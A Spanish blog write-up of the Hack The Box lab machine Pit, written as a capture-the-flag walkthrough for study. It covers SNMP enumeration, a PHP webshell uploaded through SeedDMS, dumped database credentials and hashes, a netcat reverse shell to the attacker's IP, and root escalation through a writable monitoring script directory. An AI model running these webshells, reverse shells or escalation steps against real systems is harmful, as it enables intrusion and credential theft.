@@ -1,0 +1,664 @@
+---
+layout: post
+title: Pit
+date: 2023-02-10
+description:
+img:
+fig-caption:
+tags: [OSCP, eWPT]
+---
+___
+
+<center><img src="/writeups/assets/img/Pit-htb/Pit.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Enumeración Web
+
+* Information Disclosure
+
+* Ejecución de comandos a través de SNMP (Fallido)
+
+* Arbitrary File Upload
+
+* Abuso de tarea por SNMP
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.241 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 08:30 GMT
+Nmap scan report for 10.10.10.241
+Host is up (0.23s latency).
+Not shown: 65499 filtered tcp ports (no-response), 33 filtered tcp ports (admin-prohibited)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9090/tcp open  zeus-admin
+
+Nmap done: 1 IP address (1 host up) scanned in 28.07 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,80,9090 10.10.10.241 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 08:31 GMT
+Nmap scan report for 10.10.10.241
+Host is up (0.24s latency).
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 6fc3408f6950695a57d79c4e7b1b9496 (RSA)
+|   256 c26ff8aba12083d160abcf632dc865b7 (ECDSA)
+|_  256 6b656ca692e5cc76175a2f9ae750c350 (ED25519)
+80/tcp   open  http            nginx 1.14.1
+|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
+|_http-server-header: nginx/1.14.1
+9090/tcp open  ssl/zeus-admin?
+|_ssl-date: TLS randomness does not represent time
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 400 Bad request
+|     Content-Type: text/html; charset=utf8
+|     Transfer-Encoding: chunked
+|     X-DNS-Prefetch-Control: off
+|     Referrer-Policy: no-referrer
+|     X-Content-Type-Options: nosniff
+|     Cross-Origin-Resource-Policy: same-origin
+|     <!DOCTYPE html>
+|     <html>
+|     <head>
+|     <title>
+|     request
+|     </title>
+|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+|     <style>
+|     body {
+|     margin: 0;
+|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
+|     font-size: 12px;
+|     line-height: 1.66666667;
+|     color: #333333;
+|     background-color: #f5f5f5;
+|     border: 0;
+|     vertical-align: middle;
+|     font-weight: 300;
+|_    margin: 0 0 10p
+| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
+| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
+| Not valid before: 2020-04-16T23:29:12
+|_Not valid after:  2030-06-04T16:09:12
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9090-TCP:V=7.93%T=SSL%I=7%D=2/10%Time=63E60121%P=x86_64-pc-linux-gn
+SF:u%r(GetRequest,E70,"HTTP/1\.1\x20400\x20Bad\x20request\r\nContent-Type:
+SF:\x20text/html;\x20charset=utf8\r\nTransfer-Encoding:\x20chunked\r\nX-DN
+SF:S-Prefetch-Control:\x20off\r\nReferrer-Policy:\x20no-referrer\r\nX-Cont
+SF:ent-Type-Options:\x20nosniff\r\nCross-Origin-Resource-Policy:\x20same-o
+SF:rigin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x20\x20
+SF:<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title>\n\x20\x20\x20\x20<met
+SF:a\x20http-equiv=\"Content-Type\"\x20content=\"text/html;\x20charset=utf
+SF:-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=de
+SF:vice-width,\x20initial-scale=1\.0\">\n\x20\x20\x20\x20<style>\n\tbody\x
+SF:20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200;\n\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20\"RedHatDi
+SF:splay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20Arial,\x20sans-serif;\n\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2012px;\n\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20line-height:\x201\.6666666
+SF:7;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#333333;\
+SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background-color:\x20#
+SF:f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border:\
+SF:x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20vertical-align:\
+SF:x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20\x20
+SF:\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-w
+SF:eight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20\x20
+SF:\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20mar
+SF:gin:\x200\x200\x2010p")%r(HTTPOptions,E70,"HTTP/1\.1\x20400\x20Bad\x20r
+SF:equest\r\nContent-Type:\x20text/html;\x20charset=utf8\r\nTransfer-Encod
+SF:ing:\x20chunked\r\nX-DNS-Prefetch-Control:\x20off\r\nReferrer-Policy:\x
+SF:20no-referrer\r\nX-Content-Type-Options:\x20nosniff\r\nCross-Origin-Res
+SF:ource-Policy:\x20same-origin\r\n\r\n29\r\n<!DOCTYPE\x20html>\n<html>\n<
+SF:head>\n\x20\x20\x20\x20<title>\r\nb\r\nBad\x20request\r\nd08\r\n</title
+SF:>\n\x20\x20\x20\x20<meta\x20http-equiv=\"Content-Type\"\x20content=\"te
+SF:xt/html;\x20charset=utf-8\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\
+SF:"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x20\x
+SF:20\x20<style>\n\tbody\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20margin:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20fon
+SF:t-family:\x20\"RedHatDisplay\",\x20\"Open\x20Sans\",\x20Helvetica,\x20A
+SF:rial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20f
+SF:ont-size:\x2012px;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20lin
+SF:e-height:\x201\.66666667;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20color:\x20#333333;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0background-color:\x20#f5f5f5;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\x20
+SF:\x20\x20\x20\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20border:\x200;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20vertical-align:\x20middle;\n\x20\x20\x20\x20\x20\x20\x20\x20}\n\
+SF:x20\x20\x20\x20\x20\x20\x20\x20h1\x20{\n\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20font-weight:\x20300;\n\x20\x20\x20\x20\x20\x20\x20\x20
+SF:}\n\x20\x20\x20\x20\x20\x20\x20\x20p\x20{\n\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20margin:\x200\x200\x2010p");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 232.53 seconds
+
+```
+
+# Puerto 80 (HTTP)
+
+Con whatweb, analizo las tecnologías que está empleando el servidor web
+
+```null
+whatweb http://10.10.10.241
+http://10.10.10.241 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
+```
+
+La página principal del puerto 80 se ve así:
+
+<img src="/writeups/assets/img/Pit-htb/1.png">
+
+Aplico fuzzing para descubrir rutas
+
+```null
+gobuster dir -u http://10.10.10.241/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html
+===============================================================
+Gobuster v3.4
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.241/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.4
+[+] Extensions:              html
+[+] Timeout:                 10s
+===============================================================
+2023/02/10 08:35:56 Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 4057]
+/404.html             (Status: 200) [Size: 3971]
+```
+
+# Puerto 9090 (HTTPS)
+
+En la página principal hay un formulario de inicio de sesión, donde aparace un domino. Lo añado al /etc/hosts
+
+<img src="/writeups/assets/img/Pit-htb/2.png">
+
+Inspeccionando el certificado, encuentro un CN
+
+```null
+openssl s_client -connect 10.10.10.241:9090 | grep CN
+Can't use SSL_get_servername
+depth=0 C = US, O = 4cd9329523184b0ea52ba0d20a1a6f92, CN = dms-pit.htb
+```
+
+Se está aplicando Virtual Hosting en el puerto 80
+
+<img src="/writeups/assets/img/Pit-htb/3.png">
+
+Vuelvo a aplicar fuzzing pero no encuentro nada de interés
+
+Aplico un escaneo de puertos pero por UDP
+
+```null
+nmap -sU --top-ports 500 --open --min-rate 5000 -n -Pn -sS 10.10.10.241 -oG openportsudp
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-10 08:56 GMT
+Nmap scan report for 10.10.10.241
+Host is up (0.21s latency).
+Not shown: 491 filtered tcp ports (no-response), 11 filtered udp ports (admin-prohibited), 6 filtered tcp ports (admin-prohibited), 488 open|filtered udp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+9090/tcp open  zeus-admin
+161/udp  open  snmp
+
+Nmap done: 1 IP address (1 host up) scanned in 12.38 seconds
+```
+
+Encuentra el SNMP. En caso de que conozca la community string (SecLists trae un diccionario para aplicar fuerza bruta), podría intentar enumerar información de la máquina, así como extraer su dirección IPv6.
+
+```null
+locate snmp.txt
+/usr/share/wordlists/SecLists/Discovery/SNMP/snmp.txt
+
+onesixtyone -c /usr/share/wordlists/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241
+Scanning 1 hosts, 3220 communities
+10.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64
+```
+
+Sabiendo que public es válida, puedo enumerar el SNMP con ```snmpwalk```
+
+No puedo extraer la IPv6
+
+```null
+snmpwalk -c public -v 2c 10.10.10.241 ipAddressType
+IP-MIB::ipAddressType = No Such Object available on this agent at this OID
+```
+
+Para ir mucho más rápido, utilizo ```snmpbulkwalk```
+
+```null
+snmpbulkwalk -c public -v 2c 10.10.10.241 > snmpscan
+```
+
+Puedo listar una gran cantidad de procesos, pero no los suficientes. De todo el output que devuelve ese comando saco en claro que hay un firewall por detrás, una base de datos mysql y que se está empleando PHP. Por defecto esta herramienta utiliza un OID=2, lo que implica que no se esté enumerando desde la raíz. Lo cambio a uno para empezar desde el principio
+
+```null
+snmpbulkwalk -c public -v 2c 10.10.10.241 1 > snmpscan
+```
+
+Se leakea la ruta donde del servidor web ```/var/www/html/seeddms51x/seeddms``` y dos usuarios
+
+```null
+Login Name           SELinux User         MLS/MCS Range        Service
+
+__default__          unconfined_u         s0-s0:c0.c1023       *
+michelle             user_u               s0                   *
+root                 unconfined_u         s0-s0:c0.c1023       *
+```
+
+Se está ejecutando el ```/usr/bin/monitor/``` y se quedo en espera de datos
+
+```null
+NET-SNMP-EXTEND-MIB::nsExtendCommand."monitoring" = STRING: /usr/bin/monitor
+NET-SNMP-EXTEND-MIB::nsExtendArgs."memory" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendArgs."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."memory" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendInput."monitoring" = STRING: 
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."memory" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendCacheTime."monitoring" = INTEGER: 5
+NET-SNMP-EXTEND-MIB::nsExtendExecType."memory" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendExecType."monitoring" = INTEGER: exec(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."memory" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendRunType."monitoring" = INTEGER: run-on-read(1)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."memory" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStorage."monitoring" = INTEGER: permanent(4)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."memory" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendStatus."monitoring" = INTEGER: active(1)
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."memory" = STRING:               total        used        free      shared  buff/cache   available
+NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."monitoring" = STRING: Database status
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."memory" = STRING:               total        used        free      shared  buff/cache   available
+Mem:        4023492      309080     3361820        8764      352592     3441436
+Swap:       1961980           0     1961980
+NET-SNMP-EXTEND-MIB::nsExtendOutputFull."monitoring" = STRING: Database status
+OK - Connection to database successful.
+System release info
+```
+
+El comando ```uptime``` se ejecuta cada vez que realizo el escaneo
+
+```null
+STRING: System uptime
+STRING:  04:15:20 up 53 min,  0 users,  load average: 0.37, 0.09, 0.07
+```
+
+Hago un escaneo de los objetos extendidos
+
+```null
+snmpbulkwalk -c public -v 2c 10.10.10.241 1 NET-SNMP-EXTEND-MIB::nsExtendObjects > snmpscan
+```
+
+Encuentro varios usuarios definidos por SELinux
+
+```null
+                Labeling   MLS/       MLS/                          
+SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
+
+guest_u         user       s0         s0                             guest_r
+root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
+staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
+sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
+system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
+user_u          user       s0         s0                             user_r
+xguest_u        user       s0         s0                             xguest_r
+login
+```
+
+Trato de inyectar un comando, pero no tengo acceso
+
+```null
+snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c public 10.10.10.241 \
+    'nsExtendStatus."evilcommand"'  = createAndGo \
+    'nsExtendCommand."evilcommand"' = /bin/echo \
+    'nsExtendArgs."evilcommand"'    = 'Test'
+Error in packet.
+Reason: noAccess
+Failed object: NET-SNMP-EXTEND-MIB::nsExtendStatus."evilcommand"
+```
+
+Pruebo a introducir la ruta que vi antes en el Firefox y resuelve a otra URL que no habría podido fuzzear
+
+<img src="/writeups/assets/img/Pit-htb/4.png">
+
+Busco vulnerabilidades para ```seddms```
+
+```null
+searchsploit seeddms
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                 |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated)                                                                                                                | php/webapps/50062.py
+SeedDMS 5.1.18 - Persistent Cross-Site Scripting                                                                                                                               | php/webapps/48324.txt
+SeedDMS < 5.1.11 - 'out.GroupMgr.php' Cross-Site Scripting                                                                                                                     | php/webapps/47024.txt
+SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting                                                                                                                       | php/webapps/47023.txt
+SeedDMS versions < 5.1.11 - Remote Command Execution                                                                                                                           | php/webapps/47022.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Necesito estar autenticado
+
+```null
+Exploit Steps:
+
+Step 1: Login to the application and under any folder add a document.
+Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
+
+PHP Backdoor Code:
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+```
+
+Pruebo a iniciar sesión con michelle:michelle
+
+<img src="/writeups/assets/img/Pit-htb/5.png">
+
+Y me deja entrar
+
+<img src="/writeups/assets/img/Pit-htb/6.png">
+
+Una vez subido el documento hay que tomar el identificador (en mi caso 32) para poder apuntar al archivo en PHP
+
+<img src="/writeups/assets/img/Pit-htb/7.png">
+
+Puedo ejecutar comandos, pero no enviarme una reverse shell, debido a las reglas de Firewall implementadas. Tampoco tengo acceso al directorio /home
+
+<img src="/writeups/assets/img/Pit-htb/8.png">
+
+Al ponerme en escucha de trazas ICMP y enviar un ping recibo esto:
+
+```null
+tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+10:28:47.091123 IP 10.10.10.241 > 10.10.16.5: ICMP host 10.10.10.241 unreachable - admin prohibited filter, length 68
+10:28:47.136368 IP 10.10.10.241 > 10.10.16.5: ICMP host 10.10.10.241 unreachable - admin prohibited filter, length 68
+```
+
+Para trabajar más cómodamente, utilizo una herramienta llamada [TtyOverHTTP](https://github.com/s4vitar/ttyoverhttp)
+
+```null
+python3 tty_over_http.py
+> whoami
+nginx
+```
+
+Encuentro un archivo de configuración
+
+```null
+> pwd
+/var/www/html/seeddms51x/conf
+> ls
+settings.xml
+settings.xml.template
+stopwords.txt
+```
+
+Tiene credenciales de acceso a la base de datos
+
+```null
+<database dbDriver="mysql" dbHostname="localhost" dbDatabase="seeddms" dbUser="seeddms" dbPass="ied^ieY6xoquu" doNotCheckVersion="false">
+```
+
+No encuentra ```MySQL``` pero eso es porque el Path es muy pequeño
+
+```null
+> echo $PATH
+> which mysql
+> echo $PATH
+> /usr/local/bin:/usr/bin
+```
+
+Exporto mi Path al suyo, aunque tenga rutas que no existan
+
+```null
+> export PATH=/root/gems/bin:/root/gems/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/opt:/opt/go/bin:/opt/gradle/gradle-7.5.1/bin:/opt/zerologon:/home/rubbx/.cargo/bin/:/home/root/.local/bin:/root/.fzf/bin:/opt:/opt/go/bin:/opt/gradle/gradle-7.5.1/bin:/opt/zerologon:/home/rubbx/.cargo/bin/:/home/root/.local/bin
+> which mysql
+/usr/bin/mysql
+```
+
+Listo todas las tablas
+
+```null
+mysqlshow -useeddms -p'ied^ieY6xoquu' seeddms 2>&1
+Database: seeddms
++------------------------------+
+|            Tables            |
++------------------------------+
+| tblACLs                      |
+| tblAttributeDefinitions      |
+| tblCategory                  |
+| tblDocumentApproveLog        |
+| tblDocumentApprovers         |
+| tblDocumentAttributes        |
+| tblDocumentCategory          |
+| tblDocumentContent           |
+| tblDocumentContentAttributes |
+| tblDocumentFiles             |
+| tblDocumentLinks             |
+| tblDocumentLocks             |
+| tblDocumentReviewLog         |
+| tblDocumentReviewers         |
+| tblDocumentStatus            |
+| tblDocumentStatusLog         |
+| tblDocuments                 |
+| tblEvents                    |
+| tblFolderAttributes          |
+| tblFolders                   |
+| tblGroupMembers              |
+| tblGroups                    |
+| tblKeywordCategories         |
+| tblKeywords                  |
+| tblMandatoryApprovers        |
+| tblMandatoryReviewers        |
+| tblNotify                    |
+| tblSessions                  |
+| tblUserImages                |
+| tblUserPasswordHistory       |
+| tblUserPasswordRequest       |
+| tblUsers                     |
+| tblVersion                   |
+| tblWorkflowActions           |
+| tblWorkflowDocumentContent   |
+| tblWorkflowLog               |
+| tblWorkflowMandatoryWorkflow |
+| tblWorkflowStates            |
+| tblWorkflowTransitionGroups  |
+| tblWorkflowTransitionUsers   |
+| tblWorkflowTransitions       |
+| tblWorkflows                 |
++------------------------------+
+```
+
+Y las columnas para la tabla tblUsers
+
+```null
+mysqlshow -useeddms -p'ied^ieY6xoquu' seeddms tblUsers 2>&1
+Database: seeddms  Table: tblUsers
++---------------+--------------+-----------------+------+-----+---------+----------------+---------------------------------+---------+
+| Field         | Type         | Collation       | Null | Key | Default | Extra          | Privileges                      | Comment |
++---------------+--------------+-----------------+------+-----+---------+----------------+---------------------------------+---------+
+| id            | int(11)      |                 | NO   | PRI |         | auto_increment | select,insert,update,references |         |
+| login         | varchar(50)  | utf8_general_ci | YES  | UNI |         |                | select,insert,update,references |         |
+| pwd           | varchar(50)  | utf8_general_ci | YES  |     |         |                | select,insert,update,references |         |
+| fullName      | varchar(100) | utf8_general_ci | YES  |     |         |                | select,insert,update,references |         |
+| email         | varchar(70)  | utf8_general_ci | YES  |     |         |                | select,insert,update,references |         |
+| language      | varchar(32)  | utf8_general_ci | NO   |     |         |                | select,insert,update,references |         |
+| theme         | varchar(32)  | utf8_general_ci | NO   |     |         |                | select,insert,update,references |         |
+| comment       | text         | utf8_general_ci | NO   |     |         |                | select,insert,update,references |         |
+| role          | smallint(1)  |                 | NO   |     | 0       |                | select,insert,update,references |         |
+| hidden        | smallint(1)  |                 | NO   |     | 0       |                | select,insert,update,references |         |
+| pwdExpiration | datetime     |                 | YES  |     |         |                | select,insert,update,references |         |
+| loginfailures | tinyint(4)   |                 | NO   |     | 0       |                | select,insert,update,references |         |
+| disabled      | smallint(1)  |                 | NO   |     | 0       |                | select,insert,update,references |         |
+| quota         | bigint(20)   |                 | YES  |     |         |                | select,insert,update,references |         |
+| homefolder    | int(11)      |                 | YES  | MUL |         |                | select,insert,update,references |         |
++---------------+--------------+-----------------+------+-----+---------+----------------+---------------------------------+---------+
+```
+
+Extraigo usuario y contraseña
+
+```null
+mysql -useeddms -p'ied^ieY6xoquu' -e 'select email,pwd from tblUsers' seeddms 2>&1
+email	pwd
+admin@pit.htb	155dd275b4cb74bd1f80754b61148863
+NULL	NULL
+michelle@pit.htb	2345f10bb948c5665ef91f6773b3e455
+jack@dms-pit.htb	682d305fdaabc156430c4c6f6f5cc65d
+```
+
+Las crackeo, pero son la misma que tenía
+
+```null
+john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Press 'q' or Ctrl-C to abort, almost any other key for status
+michelle         (?)     
+1g 0:00:00:00 DONE (2023-02-10 11:44) 1.694g/s 24310Kp/s 24310Kc/s 24311KC/s  filimani..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Pruebo a reutilizar la contraseña de la base de datos para el panel de CentOS
+
+<img src="/writeups/assets/img/Pit-htb/9.png">
+
+Para el usuario michelle es válida
+
+<img src="/writeups/assets/img/Pit-htb/10.png">
+
+Tengo una consola como este usuario
+
+<img src="/writeups/assets/img/Pit-htb/11.png">
+
+Meto mi clave pública en las authorized_keys de la máquina
+
+```null
+[michelle@pit .ssh]$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCji8ibO+QRRqf4hWb7EJLmqidhSvKIjV1U+qi910slj9DBWUktU2Z6dX+QBJHm1kiHbUFsxx4r3PQEUqS3BvWEOjZlORb2ee0RDbfNvJpxhsispuDAMaZpalyF/0I+gyYtvKLqUBmn8FSx4AxcE/hsiLDAD9s/xjbMAljzJB+D1UUPHeFy7QVETaG3+kQooId6OkWGzpb1KzZbFYVNspcMLfJPSsqOc3Mgvzvnbo7YJ2Lgrx1Wkct5qMWWq6A8Mc0hSu3jp6ZRqgQdua/jwzdUOGlYSA85goIyGnDD1a7x0g4+fZ3hqNDyPzO+DliSrdmHnPR1btN9Dsq3OC72+TxUSbu46YnKVC8hEhcTjSQ5r7AdcQ3tTZD7MR1V7wVlD4yuWBPVHBn7yDshXdqaMAvZtdjH/+0jWiBvoB3p0tEEAbkWILKjkR0DHeuAQwFytpLyxR4jZFaIE8FoZHV/5NHJevmgRRsGi0m3AGwIXUDY1fDoi35gLhaa17hjAbU+LEc= root@kali' > authorized_keys
+```
+
+Pero sigue sin dejar conectarme por SSH
+
+```null
+ssh michelle@10.10.10.241
+michelle@10.10.10.241: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).
+```
+
+Seguramente sea por el Firewall, así que de momento lo dejo de lado
+
+Puedo visualizar la primera flag
+
+```null
+[michelle@pit ~]$ cat user.txt
+3eafb09259fd2d7a9dc8307958ba29dc
+```
+
+Aunque como está SeLinux por detrás, es probable que ahora si que tenga salida de tráfico desde el equipo. Con netcat sí que puedo enviarme una reverse shell
+
+```null
+[michelle@pit ~]$ nc -e /bin/bash 10.10.16.5 443
+```
+
+En mi equipo recibo la sesión
+
+# Escalada
+
+Ya puedo ver de que se trata el ```/usr/bin/monitor```
+
+```null
+[michelle@pit /]$ ls -l /usr/bin/monitor 
+-rwxr--r--. 1 root root 88 Apr 18  2020 /usr/bin/monitor
+```
+
+Es un script en bash que se encarga de ejecutar ciertos archivos
+
+```null
+#!/bin/bash
+
+for script in /usr/local/monitoring/check*sh
+do
+    /bin/bash $script
+done
+```
+
+Tengo capacidad de escritura en el directorio
+
+```null
+[michelle@pit monitoring]$ ls -l /usr/local/ | grep monitoring
+drwxrwx---+ 2 root root 101 Feb 10 07:15 monitoring
+[michelle@pit monitoring]$ getfacl /usr/local/monitoring/
+getfacl: Removing leading '/' from absolute path names
+# file: usr/local/monitoring/
+# owner: root
+# group: root
+user::rwx
+user:michelle:-wx
+group::rwx
+mask::rwx
+other::---
+```
+
+Le intento asignar el privilegio SUID a la bash. Es importante estar dentro del directorio y crear el archivo desde ahí. En caso contrario puede entrar en conflicto con los permisos
+
+```null
+[michelle@pit monitoring]$ echo 'chmod u+s /bin/bash' > check_pwned.sh
+```
+
+Pero cuando ejecuto el script con ```snmpwalk``` no hace nada
+
+```null
+snmpwalk -v2c -c public 10.10.10.241 NET-SNMP-EXTEND-MIB::nsExtendObjects
+```
+
+Pruebo de nuevo a meter me clave pública de SSH, pero esta vez en el directorio /root
+
+```null
+[michelle@pit monitoring]$ echo 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCji8ibO+QRRqf4hWb7EJLmqidhSvKIjV1U+qi910slj9DBWUktU2Z6dX+QBJHm1kiHbUFsxx4r3PQEUqS3BvWEOjZlORb2ee0RDbfNvJpxhsispuDAMaZpalyF/0I+gyYtvKLqUBmn8FSx4AxcE/hsiLDAD9s/xjbMAljzJB+D1UUPHeFy7QVETaG3+kQooId6OkWGzpb1KzZbFYVNspcMLfJPSsqOc3Mgvzvnbo7YJ2Lgrx1Wkct5qMWWq6A8Mc0hSu3jp6ZRqgQdua/jwzdUOGlYSA85goIyGnDD1a7x0g4+fZ3hqNDyPzO+DliSrdmHnPR1btN9Dsq3OC72+TxUSbu46YnKVC8hEhcTjSQ5r7AdcQ3tTZD7MR1V7wVlD4yuWBPVHBn7yDshXdqaMAvZtdjH/+0jWiBvoB3p0tEEAbkWILKjkR0DHeuAQwFytpLyxR4jZFaIE8FoZHV/5NHJevmgRRsGi0m3AGwIXUDY1fDoi35gLhaa17hjAbU+LEc= root@kali" > tee /root/.ssh/authorized_keys' > checkpwned.sh
+```
+
+Gano acceso por SSH como el usuario root y puedo visualizar la segunda flag
+
+```null
+ssh root@10.10.10.241
+Web console: https://pit.htb:9090/
+
+Last login: Fri Feb 10 07:31:54 2023 from 10.10.16.5
+[root@pit ~]# cat /root/root.txt
+0b88268b1cb6e2db395865c7ba73d973
+```
